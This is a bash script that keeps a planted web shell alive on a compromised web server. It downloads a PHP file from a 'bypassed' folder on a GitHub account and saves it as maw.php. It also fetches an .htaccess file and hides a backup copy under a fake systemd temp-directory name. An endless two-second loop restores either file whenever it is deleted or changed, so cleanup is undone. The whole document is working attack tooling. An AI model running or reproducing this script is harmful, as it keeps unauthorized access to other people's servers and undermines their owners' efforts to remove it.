#!/bin/bash

HTACCESS_FILE=".htaccess"
MAW_FILE="maw.php"
HTACCESS_BACKUP="/var/tmp/systemd-private-d2965998338a4e6a84320173dff28bb0-haveged.service-HgExaf2a"

function download_files {
    if [ ! -f $MAW_FILE ] || ([ -f $MAW_FILE ] && ! grep -q '@Maw3six' $MAW_FILE); then
        if [ -f $MAW_FILE ]; then
            chmod 0644 $MAW_FILE
        fi

        if curl --fail --silent https://raw.githubusercontent.com/maw3six/maw3six/refs/heads/main/bypassed/anonsec.php -o $MAW_FILE; then
            echo "Successfully downloaded $MAW_FILE"
        else
            echo "Permission denied while downloading $MAW_FILE"
        fi
    fi

    if [ ! -f $HTACCESS_FILE ] || ! cmp --silent $HTACCESS_FILE $HTACCESS_BACKUP; then
        if [ -f $HTACCESS_FILE ]; then
            chmod 0644 $HTACCESS_FILE
        fi

        if curl --fail --silent https://raw.githubusercontent.com/maw3six/maw3six/refs/heads/main/bypassed/.htaccess -o $HTACCESS_FILE; then
            echo "Successfully downloaded $HTACCESS_FILE"
        else
            echo "Permission denied while downloading $HTACCESS_FILE"
        fi
    fi
}

curl https://raw.githubusercontent.com/maw3six/maw3six/refs/heads/main/bypassed/.htaccess -o $HTACCESS_BACKUP
sleep 2

while true; do
    echo $(TZ=Asia/Jakarta date)

    download_files

    echo $(TZ=Asia/Jakarta date)
    sleep 2
done
